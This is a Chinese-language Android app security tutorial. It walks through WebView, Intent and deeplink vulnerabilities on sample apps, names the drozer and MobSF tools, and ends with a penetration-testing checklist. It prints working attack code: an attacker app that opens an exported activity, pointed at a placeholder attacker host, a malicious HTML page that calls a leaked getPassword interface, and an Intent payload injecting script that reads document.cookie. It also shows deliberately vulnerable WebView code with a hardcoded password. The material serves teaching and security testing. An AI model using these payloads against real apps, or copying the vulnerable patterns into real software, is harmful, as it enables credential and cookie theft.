<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsIntentActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_intent);</span><br><span class="line">        <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.Wind_webviewIntent);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">        webView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        webView.loadData(<span class="string">&quot;&quot;</span>, <span class="string">&quot;text/html&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">getUri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        webView.loadUrl(String.valueOf(getUri));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;WindXaa12345678&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们可以看出我们获取了密码<code>WindXaa12345678</code>，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了</p>
<p>我们将该组件设置为导出组件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_8793MBMDUVDZESQ.png" alt="image-20220729171422196"></p>
<p>我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击</p>
<p>编写攻击样本:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">attackIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                attackIntent.setClassName(<span class="string">&quot;com.iwindxaa.webview&quot;</span>,<span class="string">&quot;com.iwindxaa.webview.JsIntentActivity&quot;</span>);</span><br><span class="line">                attackIntent.setData(Uri.parse(<span class="string">&quot;http://ip地址端口号/attack.html&quot;</span>));</span><br><span class="line">                startActivity(attackIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们在本地编写恶意的html，利用前面讲述的远程加载</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>攻击获得的数据将显示在此……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>然后启动http_server</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_25GBQWTFBW4APF8.png" alt="image-20220729172309137"></p>
<p>此时我们启动攻击样本，并点击按钮，就能加载我们的恶意html，进而获得敏感信息</p>
<h5 id="Intent重定向导致launchAnyWhere漏洞"><strong>Intent重定向导致launchAnyWhere漏洞</strong></h5>
<p><strong>漏洞原理</strong></p>
<p>导出组件往往存在一定的安全问题</p>
<p>导出组件一般有下面三种形式：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="keyword">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="keyword">false</span>，但是其intent-<span class="keyword">filter</span>以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API <span class="keyword">Level</span>在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="keyword">true</span>，<span class="number">17</span>及以上默认值为<span class="keyword">false</span>。</span><br></pre></td></tr></table></figure>
<p>未导出组件</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">组件没有intent-<span class="built_in">filter</span>, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-<span class="built_in">filter</span>,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure>
<p>而通过一些方法可以访问未导出的组件，这种漏洞成为launchAnyWhere漏洞</p>
<p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p>
<p><strong>漏洞复现</strong></p>
<p>首先是不可导出组件PrivateActivity:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_DFCPGD63DGYF3HU.png" alt="image-20220730124850689"></p>
<p>然后可导出的组件：WebView2Activity</p>
<p>代码层的校验代码：</p>
<p>WebView2Activity</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_UTXVH9Q5AYRTWVH-17277663837329.png" alt="image-20220730125041041"></p>
<p>PrivateActivity</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_MMQXRU274JXCJRT-172776639201112.png" alt="image-20220730125108657"></p>
<p>攻击代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_W4Q2EBR4BJMXG2R-172776641592615.png" alt="image-20220730125254413"></p>
<p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p>
<h4 id="Deeplink-WebView漏洞">Deeplink + WebView漏洞</h4>
<h5 id="任意代码执行漏洞"><strong>任意代码执行漏洞</strong></h5>
<p><strong>漏洞原理</strong></p>
<p>样本代码层通过反射调用某个手机上已经安装的应用，然后调用这个应用的方法，我们可以构造相同的包名，然后将攻击样本安装到手机上去，使得应用触发任意代码执行漏洞</p>
<p>样本代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ZTVPKHEC4XQMYCD.png" alt="image-20220730125800892"></p>
<p>调用com.insecureshopapp.Maininterface下的getinstance方法</p>
<p>构造攻击样本</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_J9EY8R3E44SH4U5.png" alt="image-20220730125820419"></p>
<p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p>
<h5 id="xss注入漏洞"><strong>xss注入漏洞</strong></h5>
<p><strong>漏洞原理</strong></p>
<p>结合Deeplink+WebView导致的一个漏洞问题，我们可以构造含深度调用链的js，然后通过加载去实现xss注入</p>
<p><strong>漏洞复现</strong></p>
<p>首先我们查看样本的DeepLinks</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_NAWTWSGDKWK8C82.png" alt="image-20220730130234190"></p>
<p>然后我们可以发现样本的代码：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_8KJCX2AWWZRCTQQ.png" alt="image-20220730130256549"></p>
<p>我们构造攻击脚本：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_QA4SKBFC23HK4T8.png" alt="image-20220730130336427"></p>
<p>然后我们通过去访问该html:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_7XWKDCAB62358C7.png" alt="image-20220730130416578"></p>
<p>接着我们使用目标样本打开：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_WZVGRQ9J7AZPFDA.png" alt="image-20220730130442740"></p>
<p>即可以成功的进行XSS注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_ARQAAUCNDV3N5BR.png" alt="image-20220730130506890"></p>
<h5 id="DeepLinks在WebView上的组合漏洞">DeepLinks在WebView上的组合漏洞</h5>
<p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_V55CMQ4ACJKK8WX.png" alt="image-20220730130714437"></p>
<p>参考文章：<a target="_blank" rel="noopener" href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p>
<h5 id="loadDataWithBaseURL漏洞">loadDataWithBaseURL漏洞</h5>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?">Android中的特殊攻击面（二）——危险的deeplink</a></p>
<p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控时，可以构造任意域下的XSS</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> loadDataWithBaseURL</span><br><span class="line">(<span class="built_in">String</span> baseUrl,</span><br><span class="line"><span class="built_in">String</span> <span class="built_in">data</span>,</span><br><span class="line"><span class="built_in">String</span> mimeType,</span><br><span class="line"><span class="built_in">String</span> encoding,</span><br><span class="line"><span class="built_in">String</span> historyUrl)</span><br></pre></td></tr></table></figure>
<p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL<span class="punctuation">(</span><span class="string">&quot;https://google.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure>
<p><strong>漏洞原理</strong></p>
<p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p>
<p><strong>漏洞复现</strong></p>
<p>实现步骤：</p>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)victim-app://c/contact/<span class="number">2</span>?fragmen_class=<span class="variable">&lt;fragment&gt;</span>可启动任意<span class="keyword">fragment</span>，并可 通过Intent Extra传参</span><br><span class="line">(<span class="number">2</span>)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(<span class="number">3</span>)可污染<span class="built_in">load</span>DataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.<span class="built_in">load</span>DataWithBaseURL(<span class="string">&quot;victim.com&quot;</span>,<span class="string">&quot;google-map.html&quot;</span>,    <span class="string">&quot;text/html&quot;</span>,    ...);</span><br></pre></td></tr></table></figure>
<p>攻击代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>));</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>);</span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra);</span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure>
<h1>安全分析工具安全</h1>
<h2 id="drozer">drozer</h2>
<p>参考b站教程</p>
<h2 id="MobSF">MobSF</h2>
<p>docker安装报错，参考https://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/</p>
<p>github中下载项目，然后在相应文件夹下执行如下命令：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./setup.<span class="keyword">sh</span></span><br><span class="line">./<span class="keyword">run</span>.<span class="keyword">sh</span></span><br><span class="line">然后浏览器中 http:<span class="comment">//localhost:8000</span></span><br></pre></td></tr></table></figure>
<h1>APP渗透测试要点</h1>
<p>测试点如下图<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241005195332293.png" alt="image-20241005195332293"></p>
<h2 id="客户端程序安全">客户端程序安全</h2>
<h3 id="安装包签名">安装包签名</h3>
<p>如下命令检查apk签名</p>
<p><strong>jarsigner.exe -verify APK 文件路径 -verbose -certs</strong>     如果CN=t001s则安全</p>
<p>只有在使用直接客户的证书签名时，才认为安全。Debug 证书、第三方（如</p>
<p>开发方）证书等等均认为风险。</p>
<p><strong>安全建议</strong></p>
<p>将安装包进行签名并检测安装包签名的异常</p>
<h3 id="反编译保护">反编译保护</h3>
<p>​        测试客户端安装程序，判断是否能反编译为源代码，java 代码和 so 文件是否存在代码混淆等保护措施。未作保护的 java 代码，可以轻易分析其运行逻辑，并针对代码中的缺陷对客户端或服务器端进行攻击。成功的反编译将使得攻击者能够完整地分析 APP 的运行逻辑，尤其是相关业务接口协议、和通信加密的实现</p>
<p>如果apk有花指令，apktool会出现解包失败</p>
<h3 id="应用完整性校验">应用完整性校验</h3>
<p>​        测试客户端程序是否对自身完整性进行校验。攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。</p>
<p><strong>如果没有进行校验</strong></p>
<p>对于修改后的apk进行重新打包签名安装，仍然会正常运行（需要注意的是，如果之前安装的 APK 和修改后的 APK 签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的 APP 即可）【注：APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签名。】</p>
<p><strong>如果有进行校验</strong></p>
<p>安装的apk会无法正常运行</p>
<p><strong>威胁等级</strong></p>
<p>​        若应用完整性校验不使用 MANIFEST.MF 中的数据，且核心代码通过 JNI 技术写入.so库，同时于服务端进行相关校验，此时无风险。</p>
<p>​       若应用完整性于本地进行验证而不存在其他问题或使用 MANIFEST.MF 中的数据作为验证凭证（有新文件时提示应用完整性验证失败），此时低风险；</p>
<p>​       若在本地进行验证的基础上只通过 MANIFEST.MF 对客户端原有文件进行校验而忽略新增文件的检验，此时中风险；</p>
<p>​       若未进行应用完整性校验此时高风险</p>
<h3 id="组件安全">组件安全</h3>
<p>查看是否是可导出的</p>
<h2 id="敏感信息安全">敏感信息安全</h2>
<h3 id="数据文件">数据文件</h3>
<p>检测客户端是否保存明文敏感信息，能否防止用户敏感信息的非授权访问。</p>
<p>文件敏感信息泄露以明文存储“记住密码”居多。一般来说，先将安卓设备中的文件复制到有鼠标的主机上，方便查看。</p>
<p><strong>测试步骤</strong></p>
<p>首先查看相关文件的权限配置。</p>
<p>正常的文件权限最后三位应为空（类似“rw-rw----”），即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。</p>
<p>当客户端使用 MODE_WORLD_READABLE 或 MODE_WORLD_WRITEABLE 模式创建文件时，shared_prefs 目录下文件的权限也会多出一些，这不一定是安全问题</p>
<p>权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是 xml）进行检查，看是否包含敏感信息。</p>
<p>最后在检测 SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和webviewCache.db，如图所示。其中有可能会记录 cookies 和提交表单等信息。</p>
<p>还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p>
<h3 id="Logcat日志">Logcat日志</h3>
<p>本项主要是检查客户端程序存储在手机中的日志是否含有敏感信息。</p>
<p><strong>logcat -d</strong>    <strong>//一次性输出日志缓存，不会阻塞</strong></p>
<p><strong>安全建议</strong></p>
<p>数据传输应做到加密处理，敏感信息不要输出在 logcat 日志中</p>
<h2 id="密码安全"><strong>密码安全</strong></h2>
<h3 id="键盘劫持">键盘劫持</h3>
<p>测试客户端程序在密码等输入框是否使用自定义软键盘。安卓应用中的输入框默认使用系统软键盘，手机安装木马后，木马可以通过替换系统软键盘，记录手机键盘输过的密码</p>
<h3 id="随机布局软键盘">随机布局软键盘</h3>
<p>测试客户端实现的软键盘，是否满足键位随机布放要求。</p>
<h3 id="屏幕录像">屏幕录像</h3>
<p>客户端使用的随机布局软键盘是否会对用户点击产生视觉响应。当随机布局软键盘对用户点击产生视觉响应时，安卓木马可以通过连续截屏的方式，对用户击键进行记录，从而获得用户输入</p>
<p><strong>测试步骤</strong></p>
<p>adb shell /system/bin/screencap -p 输出 png 路径（安卓设备中）</p>
<p>在/mnt/sdcard/路径下，可以看到 1a.png：</p>
<p>还有一种验证方式是从代码方面进行验证：</p>
<p>首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20241005211913001.png" alt="image-20241005211913001"></p>
<p>目前 FLAG_SECURE 测试结果：</p>
<p>N－PASS，可截图，</p>
<p>ZTE 880E, 可截图</p>
<p>ASUS TF300T，可阻止工具及 ddms 截图。</p>
<h3 id="手势密码">手势密码</h3>
<p>主要从手势密码的复杂度、修改和取消、本地信息保存、锁定策略、抗攻击测试等方面进行测试。</p>
<p><strong>手势密码的复杂度：</strong></p>
<p>观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</p>
<p><strong>手势密码的修改和取消：</strong></p>
<p>反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</p>
<p><strong>手势密码的本地信息保存：</strong></p>
<p>首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程，寻找/data/data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）。观察存储方式是二进制形式还是明文形式，如果是二进制看看其对应位数判断进行的什么哈希散列。也可以通过这个数值定义代码位置进一步分析</p>
<p><strong>手势密码的抗攻击测试：</strong></p>
<ol>
<li>
<p>下载并安装 Xposed 框架及 SwipeBack 插件。</p>
</li>
<li>
<p>启动客户端并进入手势密码输入页。</p>
</li>
<li>
<p>启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面</p>
</li>
</ol>
<h2 id="安全策略">安全策略</h2>
<h3 id="密码复杂度检测">密码复杂度检测</h3>
<p>测试客户端程序是否检查用户输入的密码强度，禁止用户设置弱口令</p>
<p>人工测试，尝试将密码修改为弱口令，如：123456，654321，121212，888888 等，查看客户端是否拒绝弱口令。也可以阅读逆向后的客户端 java 代码，寻找对用户输入口令的检查方法。</p>
<h3 id="账号登录限制">账号登录限制</h3>
<p>测试一个帐号是否可以同时在多个设备上成功登录客户端，进行操作。</p>
<p>人工测试。</p>
<h3 id="账户锁定策略"><strong>账户锁定策略</strong></h3>
<p>测试客户端是否限制登录尝试次数。防止木马使用穷举法暴力破解用户密码</p>
<p>人工测试。</p>
<h3 id="问题验证">问题验证</h3>
<p>测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够私密</p>
<p>人工测试</p>
<h3 id="会话安全">会话安全</h3>
<p>测试客户端在超过 20 分钟无操作后，是否会使会话超时并要求重新登录。超时时间设置是否合理。</p>
<p>人工测试</p>
